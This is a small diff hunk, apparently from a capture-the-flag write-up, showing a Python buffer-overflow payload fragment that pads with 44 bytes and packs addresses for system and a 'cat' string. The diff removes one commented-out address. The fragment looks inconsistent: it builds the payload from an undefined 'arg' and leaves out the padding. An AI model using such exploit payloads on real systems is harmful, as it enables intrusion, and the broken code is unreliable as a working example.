@@ -33,7 +33,6 @@ Payload:
 ```python
 junk = ("A"* 44).encode() # once again the string needs to be encoded(bytes) so that it can be concated the paccked addresses(bytes)
 system = p32(0x8048657)
-#system = p32(0x8048430)
 cat = p32(0x804a030)
 payload = system+arg
 ```
